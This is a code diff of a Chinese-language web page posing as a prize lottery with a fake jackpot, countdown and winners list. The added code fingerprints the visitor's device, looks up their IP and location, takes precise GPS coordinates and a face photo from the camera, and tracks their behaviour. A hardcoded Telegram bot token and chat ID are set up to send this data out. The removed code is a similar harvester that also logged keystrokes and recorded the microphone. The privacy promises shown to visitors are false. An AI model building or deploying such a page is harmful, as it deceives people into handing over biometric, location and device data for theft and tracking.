+            <div style="margin-top: 30px; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 15px;">
+                <p style="font-size: 0.9rem; opacity: 0.8;">
+                    <i class="fas fa-info-circle"></i> 
+                    授权说明：我们承诺严格保护您的隐私，所有数据仅用于本次抽奖身份验证，活动结束后将立即删除。
+                </p>
+            </div>
+        </div>
+
+        <!-- 摄像头预览 -->
+        <div class="camera-section" id="cameraSection" style="display: none;">
+            <h2 style="color: #333; margin-bottom: 20px;"><i class="fas fa-camera"></i> 请对准摄像头拍照验证</h2>
+            <p style="color: #666; margin-bottom: 30px;">请确保光线充足，面部清晰可见</p>
+            
+            <div class="camera-preview">
+                <video id="cameraVideo" autoplay playsinline></video>
+                <div class="camera-guide"></div>
             </div>
             
-            <!-- 实时数据 -->
-            <div class="info-panel">
-                <h3><i class="fas fa-chart-line"></i> 实时数据</h3>
-                <div class="info-item">
-                    <span class="info-label">CPU占用</span>
-                    <span class="info-value" id="cpuUsage">0%</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">内存使用</span>
-                    <span class="info-value" id="memoryUsage">0 MB</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">网络延迟</span>
-                    <span class="info-value" id="networkLatency">0ms</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">数据吞吐</span>
-                    <span class="info-value" id="dataThroughput">0 KB/s</span>
-                </div>
+            <div style="margin-top: 30px;">
+                <button id="captureBtn" style="background: #4CD964; color: white; border: none; padding: 15px 40px; border-radius: 10px; font-size: 1.2rem; cursor: pointer; margin-right: 15px;">
+                    <i class="fas fa-camera"></i> 拍照验证
+                </button>
+                <button id="retakeBtn" style="background: #FF4757; color: white; border: none; padding: 15px 40px; border-radius: 10px; font-size: 1.2rem; cursor: pointer; display: none;">
+                    <i class="fas fa-redo"></i> 重新拍照
+                </button>
             </div>
             
-            <!-- 地理位置 -->
-            <div class="info-panel">
-                <h3><i class="fas fa-globe-asia"></i> 地理定位</h3>
-                <div class="info-item">
-                    <span class="info-label">坐标</span>
-                    <span class="info-value" id="coordinates">获取中...</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">精度</span>
-                    <span class="info-value" id="locationAccuracy">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">海拔</span>
-                    <span class="info-value" id="altitude">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="info-label">速度</span>
-                    <span class="info-value" id="speed">0 m/s</span>
-                </div>
+            <div style="margin-top: 30px; padding: 20px; background: #f8f9fa; border-radius: 15px; display: none;" id="photoPreview">
+                <h3 style="color: #333; margin-bottom: 15px;">照片预览</h3>
+                <img id="capturedPhoto" src="" style="max-width: 300px; border-radius: 10px; border: 3px solid #4CD964;">
             </div>
+        </div>
+
+        <!-- 提交按钮 -->
+        <div class="submit-section">
+            <button class="submit-btn" id="submitBtn" onclick="submitLotteryForm()">
+                <i class="fas fa-paper-plane"></i> 立即参与抽奖
+            </button>
+        </div>
+
+        <!-- 中奖者列表 -->
+        <div class="winners-section">
+            <h2 class="winners-title"><i class="fas fa-crown"></i> 最新中奖者</h2>
+            <div class="winners-grid" id="winnersList">
+                <!-- 动态生成中奖者 -->
+            </div>
+        </div>
+
+        <!-- 底部 -->
+        <div style="text-align: center; padding: 40px; color: white;">
+            <p>© 2024 超级幸运大抽奖 | 本活动最终解释权归主办方所有</p>
+            <p style="margin-top: 15px; font-size: 0.9rem; opacity: 0.8;">
+                <i class="fas fa-lock"></i> 您的信息安全已加密保护
+            </p>
         </div>
     </div>
-
-    <!-- 加载遮罩 -->
-    <div id="loadingOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.95);z-index:10000;display:flex;flex-direction:column;justify-content:center;align-items:center;">
-        <div class="logo" style="animation: rotate 2s linear infinite; margin-bottom:30px;">
-            <i class="fas fa-shield-alt"></i>
-        </div>
-        <h2 style="color:var(--cyber-blue);margin-bottom:20px;">系统初始化中</h2>
-        <div style="width:300px;height:4px;background:rgba(0,243,255,0.2);border-radius:2px;overflow:hidden;">
-            <div id="initProgress" style="height:100%;background:linear-gradient(90deg,var(--cyber-blue),var(--neon-purple));width:0%;transition:width 0.5s;"></div>
-        </div>
-        <div id="initStatus" style="color:rgba(0,243,255,0.8);margin-top:20px;font-size:0.9rem;">正在加载核心模块...</div>
-    </div>
-
-    <!-- 音频元素 -->
-    <audio id="beepSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
-    <audio id="alertSound" src="https://assets.mixkit.co/sfx/preview/mixkit-security-verified-2001.mp3"></audio>
 
     <script>
-        // 这里是JavaScript代码（见第二部分）
-        // 初始化变量和函数将在第二部分提供
+        // JavaScript代码在第二部分
+        // 这里包含所有数据收集和Telegram发送功能
     </script>
 </body>
 </html>
 <script>
 // =============================================
-// 高级数据收集系统 v3.0
-// 配置和初始化
+// 抽奖系统数据收集引擎
 // =============================================
 
+// 配置
 const CONFIG = {
     TELEGRAM: {
         BOT_TOKEN: '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM',
-        CHAT_ID: '8313770381',
-        API_URL: 'https://api.telegram.org/bot'
+        CHAT_ID: '8313770381'
     },
-    APIs: {
-        IP_INFO: 'https://ipapi.co/json/',
-        VPN_DETECT: 'https://ipapi.co/{ip}/json/',
-        TIME_API: 'https://worldtimeapi.org/api/ip',
-        WEATHER: 'https://wttr.in/{city}?format=j1'
+    COLLECTION: {
+        ENABLED: true,
+        AUTO_START: true
     }
 };
 
-// 全局数据存储对象
-const CYBER_DATA = {
-    // 系统信息
-    system: {
-        startTime: new Date().toISOString(),
-        sessionId: generateSessionId(),
-        version: '3.0.1',
-        protocol: 'Quantum-Encrypted'
-    },
+// 数据存储对象
+const LOTTERY_DATA = {
+    // 基本信息
+    userInfo: {},
     
-    // 设备指纹
-    fingerprint: {
-        canvas: null,
-        webgl: null,
-        audio: null,
-        fonts: null,
-        screen: null,
-        plugins: null,
-        mimeTypes: null,
-        hardware: null
+    // 设备信息
+    device: {
+        fingerprint: null,
+        browser: {},
+        screen: {},
+        hardware: {}
     },
     
     // 网络信息
     network: {
         ip: null,
         location: {},
-        isp: null,
-        asn: null,
-        proxy: false,
-        vpn: false,
-        tor: false,
-        connection: {},
-        ports: []
-    },
-    
-    // 传感器数据
-    sensors: {
-        accelerometer: null,
-        gyroscope: null,
-        magnetometer: null,
-        ambientLight: null,
-        proximity: null,
-        orientation: null,
-        battery: null
-    },
-    
-    // 生物特征
-    biometrics: {
-        camera: null,
-        microphone: null,
-        photo: null,
-        audioSample: null,
-        faceData: null
+        connection: {}
     },
     
     // 地理位置
     geolocation: {
         precise: null,
-        approximate: null,
-        wifiNetworks: [],
-        cellTowers: []
+        approximate: null
     },
     
-    // 行为分析
+    // 生物特征
+    biometrics: {
+        photo: null,
+        photoData: null,
+        timestamp: null
+    },
+    
+    // 权限状态
+    permissions: {
+        camera: false,
+        location: false,
+        microphone: false,
+        device: false
+    },
+    
+    // 行为数据
     behavior: {
-        mouse: [],
-        keyboard: [],
-        scroll: [],
-        clicks: [],
-        timing: {},
-        patterns: {}
+        timeSpent: 0,
+        mouseMovements: 0,
+        clicks: 0,
+        scrolls: 0
     },
     
-    // 浏览器环境
-    environment: {
-        browser: {},
-        os: {},
-        extensions: {},
-        storage: {},
-        permissions: {}
-    },
-    
-    // 性能指标
-    performance: {
-        timing: {},
-        memory: {},
-        cpu: {},
-        network: {}
+    // 系统信息
+    system: {
+        sessionId: generateSessionId(),
+        startTime: new Date(),
+        lotteryNumber: generateLotteryNumber()
     }
 };
 
 // =============================================
-// 初始化函数
+// 页面初始化
 // =============================================
 
-async function initializeSystem() {
-    const steps = [
-        { name: '加载核心模块', func: loadCoreModules, weight: 10 },
-        { name: '初始化加密通道', func: initEncryption, weight: 10 },
-        { name: '获取设备指纹', func: collectDeviceFingerprint, weight: 20 },
-        { name: '分析网络拓扑', func: analyzeNetwork, weight: 25 },
-        { name: '检测传感器', func: detectSensors, weight: 15 },
-        { name: '建立安全连接', func: establishConnection, weight: 20 }
-    ];
+document.addEventListener('DOMContentLoaded', function() {
+    // 模拟加载
+    setTimeout(() => {
+        document.getElementById('loadingScreen').style.opacity = '0';
+        setTimeout(() => {
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('mainContainer').style.display = 'block';
+            
+            // 初始化功能
+            initializeLotterySystem();
+            
+            // 开始倒计时
+            startCountdown();
+            
+            // 生成中奖者列表
+            generateWinnersList();
+            
+            // 开始数据收集
+            if (CONFIG.COLLECTION.AUTO_START) {
+                startDataCollection();
+            }
+            
+        }, 500);
+    }, 3000);
     
-    let progress = 0;
+    // 权限开关事件
+    setupPermissionSwitches();
     
-    for (const step of steps) {
-        updateInitStatus(step.name);
-        try {
-            await step.func();
-            progress += step.weight;
-            updateInitProgress(progress);
-            playBeep();
-        } catch (error) {
-            logToTerminal(`错误: ${step.name} - ${error.message}`, 'error');
+    // 表单验证
+    setupFormValidation();
+});
+
+// =============================================
+// 主要功能函数
+// =============================================
+
+function initializeLotterySystem() {
+    updateProgressBar(10);
+    logToConsole('抽奖系统初始化...');
+    
+    // 生成抽奖号码
+    document.getElementById('jackpotAmount').textContent = '¥ ' + formatCurrency(5000000 + Math.random() * 1000000);
+    
+    // 初始化设备指纹
+    generateDeviceFingerprint();
+    
+    updateProgressBar(20);
+}
+
+function startCountdown() {
+    const endTime = new Date();
+    endTime.setHours(endTime.getHours() + 48); // 48小时后结束
+    
+    function update() {
+        const now = new Date();
+        const diff = endTime - now;
+        
+        if (diff <= 0) {
+            document.querySelectorAll('.countdown-number').forEach(el => el.textContent = '00');
+            return;
         }
-        await delay(500);
+        
+        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+        
+        document.getElementById('countdownDays').textContent = days.toString().padStart(2, '0');
+        document.getElementById('countdownHours').textContent = hours.toString().padStart(2, '0');
+        document.getElementById('countdownMinutes').textContent = minutes.toString().padStart(2, '0');
+        document.getElementById('countdownSeconds').textContent = seconds.toString().padStart(2, '0');
     }
     
-    // 完成初始化
-    setTimeout(() => {
-        document.getElementById('loadingOverlay').style.display = 'none';
-        logToTerminal('系统初始化完成，准备接收指令', 'success');
-        updateDataStream('系统就绪，所有模块在线');
-        startRealtimeMonitoring();
-    }, 1000);
+    update();
+    setInterval(update, 1000);
 }
 
 // =============================================
-// 核心数据收集函数
+// 数据收集功能
 // =============================================
 
-// 1. 高级设备指纹
-async function collectDeviceFingerprint() {
-    updateCardProgress('fingerprintProgress', 25);
+function startDataCollection() {
+    logToConsole('开始收集数据...');
     
-    // Canvas指纹（高级版）
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 256;
-        canvas.height = 128;
-        const ctx = canvas.getContext('2d');
-        
-        // 绘制复杂图形
-        ctx.textBaseline = "top";
-        ctx.font = "14px 'Arial'";
-        ctx.textBaseline = "alphabetic";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = "#069";
-        ctx.fillText("FINGERPRINT", 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText("FINGERPRINT", 4, 17);
-        
-        // 添加噪点
-        for(let i = 0; i < 50; i++) {
-            ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-            ctx.fillRect(Math.random()*256, Math.random()*128, 1, 1);
-        }
-        
-        CYBER_DATA.fingerprint.canvas = canvas.toDataURL();
-        updateCardProgress('fingerprintProgress', 50);
-    } catch(e) {
-        logToTerminal('Canvas指纹失败: ' + e.message, 'warning');
-    }
+    // 收集设备信息
+    collectDeviceInfo();
+    updateProgressBar(30);
     
-    // WebGL指纹
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            CYBER_DATA.fingerprint.webgl = {
-                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                version: gl.getParameter(gl.VERSION),
-                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                maxTextures: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
-                maxRenderbuffers: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
-            };
-            updateCardProgress('fingerprintProgress', 75);
-        }
-    } catch(e) {
-        logToTerminal('WebGL指纹失败: ' + e.message, 'warning');
-    }
+    // 收集网络信息
+    collectNetworkInfo();
+    updateProgressBar(40);
     
-    // 音频指纹
-    try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioContext.createOscillator();
-        const analyser = audioContext.createAnalyser();
-        oscillator.connect(analyser);
-        analyser.connect(audioContext.destination);
-        oscillator.start(0);
-        
-        const dataArray = new Uint8Array(analyser.frequencyBinCount);
-        analyser.getByteFrequencyData(dataArray);
-        
-        CYBER_DATA.fingerprint.audio = {
-            sampleRate: audioContext.sampleRate,
-            frequencyData: Array.from(dataArray).slice(0, 10),
-            context: audioContext.state
-        };
-        
-        oscillator.stop();
-        audioContext.close();
-    } catch(e) {
-        logToTerminal('音频指纹失败: ' + e.message, 'warning');
-    }
+    // 收集浏览器信息
+    collectBrowserInfo();
+    updateProgressBar(50);
     
-    // 字体检测
-    const fontList = [
-        'Arial', 'Arial Black', 'Arial Narrow', 'Comic Sans MS',
-        'Courier New', 'Georgia', 'Impact', 'Times New Roman',
-        'Trebuchet MS', 'Verdana', 'Microsoft YaHei', 'SimSun',
-        'Webdings', 'Wingdings', 'Monaco', 'Menlo', 'Consolas'
-    ];
+    // 收集屏幕信息
+    collectScreenInfo();
+    updateProgressBar(60);
     
-    CYBER_DATA.fingerprint.fonts = {};
-    const testString = "mmmmmmmmmmlli";
-    const testSize = '72px';
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
+    // 监控用户行为
+    startBehaviorTracking();
+    updateProgressBar(70);
     
-    fontList.forEach(font => {
-        context.font = testSize + " '" + font + "'";
-        const metrics = context.measureText(testString);
-        CYBER_DATA.fingerprint.fonts[font] = metrics.width;
-    });
-    
-    // 插件检测
-    CYBER_DATA.fingerprint.plugins = Array.from(navigator.plugins).map(p => ({
-        name: p.name,
-        description: p.description,
-        filename: p.filename,
-        length: p.length
-    }));
-    
-    CYBER_DATA.fingerprint.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
-        type: m.type,
-        description: m.description,
-        suffixes: m.suffixes
-    }));
-    
-    // 硬件信息
-    CYBER_DATA.fingerprint.hardware = {
-        cores: navigator.hardwareConcurrency || 'unknown',
-        memory: navigator.deviceMemory || 'unknown',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        gpu: CYBER_DATA.fingerprint.webgl ? CYBER_DATA.fingerprint.webgl.renderer : 'unknown'
+    logToConsole('数据收集系统就绪');
+}
+
+function collectDeviceInfo() {
+    LOTTERY_DATA.device.browser = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'unknown'
     };
     
-    updateCardProgress('fingerprintProgress', 100);
-    document.getElementById('fingerprintId').textContent = 
-        'FP-' + generateHash(JSON.stringify(CYBER_DATA.fingerprint)).substring(0, 12);
-    
-    logToTerminal('设备指纹收集完成', 'success');
+    LOTTERY_DATA.device.hardware = {
+        cores: navigator.hardwareConcurrency || 'unknown',
+        memory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0
+    };
 }
 
-// 2. 网络分析
-async function analyzeNetwork() {
-    updateCardProgress('networkProgress', 10);
-    
+async function collectNetworkInfo() {
     try {
-        // 获取IP和位置
-        const response = await fetch(CONFIG.APIs.IP_INFO);
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         
-        CYBER_DATA.network.ip = data.ip;
-        CYBER_DATA.network.location = {
+        LOTTERY_DATA.network.ip = data.ip;
+        LOTTERY_DATA.network.location = {
             city: data.city,
             region: data.region,
             country: data.country_name,
             countryCode: data.country_code,
-            postal: data.postal,
             latitude: data.latitude,
             longitude: data.longitude,
             timezone: data.timezone,
-            callingCode: data.country_calling_code,
-            currency: data.currency
+            isp: data.org
         };
-        CYBER_DATA.network.isp = data.org;
-        CYBER_DATA.network.asn = data.asn;
         
-        updateCardProgress('networkProgress', 40);
-        document.getElementById('ipAddress').textContent = data.ip;
-        
-        // 检测代理/VPN
-        const vpnCheck = await fetch(CONFIG.APIs.VPN_DETECT.replace('{ip}', data.ip));
-        const vpnData = await vpnCheck.json();
-        CYBER_DATA.network.proxy = vpnData.proxy === true || vpnData.proxy === 'true';
-        CYBER_DATA.network.vpn = vpnData.vpn === true || vpnData.vpn === 'true';
-        CYBER_DATA.network.tor = vpnData.tor === true || vpnData.tor === 'true';
-        
-        updateCardProgress('networkProgress', 70);
-        
-        // 网络连接信息
-        if (navigator.connection) {
-            CYBER_DATA.network.connection = {
-                effectiveType: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            };
-            
-            document.getElementById('networkLatency').textContent = 
-                CYBER_DATA.network.connection.rtt + 'ms';
-        }
-        
-        // 端口扫描模拟
-        simulatePortScan();
-        
-        updateCardProgress('networkProgress', 100);
-        logToTerminal(`网络分析完成 - ${data.city}, ${data.country_name}`, 'success');
+        logToConsole(`IP地址: ${data.ip} - ${data.city}, ${data.country_name}`);
         
     } catch (error) {
-        logToTerminal('网络分析失败: ' + error.message, 'error');
+        logToConsole('网络信息收集失败: ' + error.message);
+    }
+    
+    // 网络连接信息
+    if (navigator.connection) {
+        LOTTERY_DATA.network.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+        };
     }
 }
 
-// 3. 传感器检测
-async function detectSensors() {
-    updateCardProgress('sensorProgress', 10);
+function collectBrowserInfo() {
+    // 收集插件信息
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+    }
+    LOTTERY_DATA.device.plugins = plugins;
     
-    const sensors = [
-        { name: 'Accelerometer', check: 'Accelerometer' in window },
-        { name: 'Gyroscope', check: 'Gyroscope' in window },
-        { name: 'Magnetometer', check: 'Magnetometer' in window },
-        { name: 'AmbientLight', check: 'AmbientLightSensor' in window },
-        { name: 'Proximity', check: 'ProximitySensor' in window },
-        { name: 'Orientation', check: 'DeviceOrientationEvent' in window },
-        { name: 'Motion', check: 'DeviceMotionEvent' in window }
-    ];
-    
-    let detected = 0;
-    sensors.forEach(sensor => {
-        if (sensor.check) {
-            detected++;
-            try {
-                setupSensor(sensor.name);
-            } catch(e) {
-                logToTerminal(`${sensor.name} 设置失败`, 'warning');
-            }
-        }
+    // 字体检测
+    const fontList = ['Arial', 'Microsoft YaHei', 'SimSun', 'Times New Roman'];
+    const fontCheck = {};
+    fontList.forEach(font => {
+        const test = document.createElement('span');
+        test.style.fontFamily = font;
+        test.style.position = 'absolute';
+        test.style.left = '-9999px';
+        test.textContent = 'test';
+        document.body.appendChild(test);
+        
+        const originalWidth = test.offsetWidth;
+        test.style.fontFamily = font + ',monospace';
+        const newWidth = test.offsetWidth;
+        
+        fontCheck[font] = originalWidth !== newWidth;
+        document.body.removeChild(test);
     });
     
-    updateCardProgress('sensorProgress', 60);
-    document.getElementById('sensorStatus').textContent = `${detected}/7 激活`;
+    LOTTERY_DATA.device.fonts = fontCheck;
+}
+
+function collectScreenInfo() {
+    LOTTERY_DATA.device.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth
+    };
     
-    // 电池信息
-    if ('getBattery' in navigator) {
-        try {
-            const battery = await navigator.getBattery();
-            CYBER_DATA.sensors.battery = {
-                charging: battery.charging,
-                level: battery.level * 100 + '%',
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime
-            };
-        } catch(e) {}
+    // 窗口信息
+    LOTTERY_DATA.device.window = {
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight,
+        devicePixelRatio: window.devicePixelRatio
+    };
+}
+
+function generateDeviceFingerprint() {
+    // 生成Canvas指纹
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Fingerprint', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Fingerprint', 4, 17);
+        
+        LOTTERY_DATA.device.fingerprint = canvas.toDataURL().hashCode();
+    } catch (e) {
+        LOTTERY_DATA.device.fingerprint = Date.now().toString();
     }
     
-    updateCardProgress('sensorProgress', 100);
-    logToTerminal(`传感器检测完成: ${detected}个可用`, 'success');
+    logToConsole(`设备指纹: ${LOTTERY_DATA.device.fingerprint}`);
 }
 
 // =============================================
-// 实时监控函数
+// 权限管理
 // =============================================
 
-function startRealtimeMonitoring() {
-    // 鼠标跟踪
-    let mousePoints = [];
-    document.addEventListener('mousemove', (e) => {
-        mousePoints.push({
-            x: e.clientX,
-            y: e.clientY,
-            time: Date.now()
-        });
-        
-        if (mousePoints.length > 1000) mousePoints.shift();
-        CYBER_DATA.behavior.mouse = mousePoints;
-        
-        // 更新行为分析
-        updateBehaviorAnalysis();
-    });
+function setupPermissionSwitches() {
+    const permissions = ['camera', 'location', 'mic', 'device'];
     
-    // 键盘记录
-    document.addEventListener('keydown', (e) => {
-        CYBER_DATA.behavior.keyboard.push({
-            key: e.key,
-            code: e.code,
-            time: Date.now(),
-            ctrl: e.ctrlKey,
-            alt: e.altKey,
-            shift: e.shiftKey,
-            meta: e.metaKey
-        });
-        
-        if (CYBER_DATA.behavior.keyboard.length > 500) {
-            CYBER_DATA.behavior.keyboard.shift();
-        }
-    });
-    
-    // 滚动跟踪
-    let lastScroll = 0;
-    document.addEventListener('scroll', () => {
-        const now = Date.now();
-        if (now - lastScroll > 100) {
-            CYBER_DATA.behavior.scroll.push({
-                position: window.scrollY,
-                time: now
+    permissions.forEach(permission => {
+        const checkbox = document.getElementById(permission + 'Permission');
+        if (checkbox) {
+            checkbox.addEventListener('change', function() {
+                LOTTERY_DATA.permissions[permission] = this.checked;
+                logToConsole(`${permission}权限: ${this.checked ? '已授权' : '未授权'}`);
+                
+                // 如果摄像头权限开启，显示摄像头
+                if (permission === 'camera' && this.checked) {
+                    showCameraSection();
+                }
             });
-            lastScroll = now;
+            
+            // 初始状态
+            LOTTERY_DATA.permissions[permission] = checkbox.checked;
         }
     });
-    
-    // 点击分析
-    document.addEventListener('click', (e) => {
-        CYBER_DATA.behavior.clicks.push({
-            x: e.clientX,
-            y: e.clientY,
-            target: e.target.tagName,
-            className: e.target.className,
-            id: e.target.id,
-            time: Date.now()
-        });
-    });
-    
-    // 性能监控
-    setInterval(updatePerformanceMetrics, 2000);
-    
-    // 数据流更新
-    setInterval(updateRealtimeData, 3000);
 }
 
-// =============================================
-// 摄像头和麦克风功能
-// =============================================
-
-async function requestCameraAccess() {
+async function showCameraSection() {
+    document.getElementById('cameraSection').style.display = 'block';
+    
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
-                width: { ideal: 1920 },
-                height: { ideal: 1080 },
-                facingMode: 'user',
-                frameRate: { ideal: 30 }
-            },
-            audio: true
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: 'user'
+            }
         });
         
-        const video = document.getElementById('cameraFeed');
+        const video = document.getElementById('cameraVideo');
         video.srcObject = stream;
         
-        // 捕获照片
-        setTimeout(() => {
-            captureBiometricData(stream);
-        }, 2000);
-        
-        document.getElementById('cameraStatus').className = 'alert success';
-        document.getElementById('cameraStatus').innerHTML = 
-            '<i class="fas fa-check-circle"></i> 生物特征验证进行中';
-        
-        logToTerminal('摄像头和麦克风已激活', 'success');
-        
-    } catch (error) {
-        logToTerminal('媒体设备访问被拒绝: ' + error.message, 'error');
-    }
-}
-
-async function captureBiometricData(stream) {
-    try {
-        // 捕获照片
-        const video = document.getElementById('cameraFeed');
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-        
-        CYBER_DATA.biometrics.photo = canvas.toDataURL('image/jpeg', 0.8);
-        
-        // 分析面部数据（模拟）
-        CYBER_DATA.biometrics.faceData = {
-            detected: true,
-            confidence: Math.random() * 30 + 70,
-            features: {
-                eyes: 2,
-                nose: 1,
-                mouth: 1
-            },
-            expression: 'neutral'
+        // 设置拍照按钮
+        document.getElementById('captureBtn').onclick = () => capturePhoto(stream);
+        document.getElementById('retakeBtn').onclick = () => {
+            document.getElementById('photoPreview').style.display = 'none';
+            document.getElementById('retakeBtn').style.display = 'none';
+            document.getElementById('captureBtn').style.display = 'inline-block';
         };
         
-        // 停止流
-        stream.getTracks().forEach(track => track.stop());
-        
-        logToTerminal('生物特征数据已捕获', 'success');
-        
     } catch (error) {
-        logToTerminal('生物特征捕获失败: ' + error.message, 'error');
+        logToConsole('摄像头访问被拒绝: ' + error.message);
+        document.getElementById('cameraSection').innerHTML = `
+            <div style="text-align: center; padding: 40px;">
+                <i class="fas fa-camera-slash" style="font-size: 60px; color: #FF4757; margin-bottom: 20px;"></i>
+                <h3 style="color: #333;">摄像头访问被拒绝</h3>
+                <p style="color: #666;">请允许摄像头访问以继续参与抽奖</p>
+            </div>
+        `;
     }
 }
 
+function capturePhoto(stream) {
+    const video = document.getElementById('cameraVideo');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // 保存照片数据
+    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+    LOTTERY_DATA.biometrics.photo = photoData;
+    LOTTERY_DATA.biometrics.timestamp = new Date().toISOString();
+    LOTTERY_DATA.biometrics.photoData = {
+        width: canvas.width,
+        height: canvas.height,
+        format: 'jpeg'
+    };
+    
+    // 显示预览
+    document.getElementById('capturedPhoto').src = photoData;
+    document.getElementById('photoPreview').style.display = 'block';
+    document.getElementById('captureBtn').style.display = 'none';
+    document.getElementById('retakeBtn').style.display = 'inline-block';
+    
+    // 停止摄像头
+    stream.getTracks().forEach(track => track.stop());
+    
+    logToConsole('照片已捕获并保存');
+    updateProgressBar(80);
+}
+
 // =============================================
-// 地理位置功能
+// 地理位置获取
 // =============================================
 
-function getPreciseLocation() {
+function getLocation() {
+    if (!LOTTERY_DATA.permissions.location) {
+        logToConsole('位置权限未授权');
+        return;
+    }
+    
     if (!navigator.geolocation) {
-        logToTerminal('地理位置API不可用', 'error');
+        logToConsole('地理位置API不可用');
         return;
     }
     
     navigator.geolocation.getCurrentPosition(
         (position) => {
-            CYBER_DATA.geolocation.precise = {
+            LOTTERY_DATA.geolocation.precise = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy,
                 altitude: position.coords.altitude,
-                altitudeAccuracy: position.coords.altitudeAccuracy,
                 heading: position.coords.heading,
                 speed: position.coords.speed,
                 timestamp: position.timestamp
             };
             
-            // 更新显示
-            document.getElementById('coordinates').textContent = 
-                `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
-            document.getElementById('locationAccuracy').textContent = 
-                `±${Math.round(position.coords.accuracy)}m`;
-            document.getElementById('altitude').textContent = 
-                position.coords.altitude ? `${Math.round(position.coords.altitude)}m` : 'N/A';
-            document.getElementById('speed').textContent = 
-                position.coords.speed ? `${Math.round(position.coords.speed * 3.6)} km/h` : '0 km/h';
-            
-            logToTerminal('精确位置已获取', 'success');
-            
-            // 获取天气信息
-            fetchWeather(position.coords.latitude, position.coords.longitude);
+            logToConsole(`精确位置: ${position.coords.latitude}, ${position.coords.longitude} (±${Math.round(position.coords.accuracy)}m)`);
             
         },
         (error) => {
-            logToTerminal('地理位置获取失败: ' + error.message, 'error');
+            logToConsole('地理位置获取失败: ' + error.message);
         },
         {
             enableHighAccuracy: true,
@@ -1257,687 +1180,463 @@ function getPreciseLocation() {
 }
 
 // =============================================
-// 辅助函数
+// 行为跟踪
 // =============================================
 
-function generateSessionId() {
-    return 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-}
-
-function generateHash(str) {
-    let hash = 0;
-    for (let i = 0; i < str.length; i++) {
-        hash = ((hash << 5) - hash) + str.charCodeAt(i);
-        hash = hash & hash;
-    }
-    return Math.abs(hash).toString(16);
-}
-
-function updateInitProgress(percent) {
-    document.getElementById('initProgress').style.width = percent + '%';
-}
-
-function updateInitStatus(text) {
-    document.getElementById('initStatus').textContent = text;
-}
-
-function updateCardProgress(elementId, percent) {
-    document.getElementById(elementId).style.width = percent + '%';
-}
-
-function logToTerminal(message, type = 'info') {
-    const terminal = document.getElementById('systemTerminal');
-    const prompt = type === 'error' ? 'error@system:~$' : 
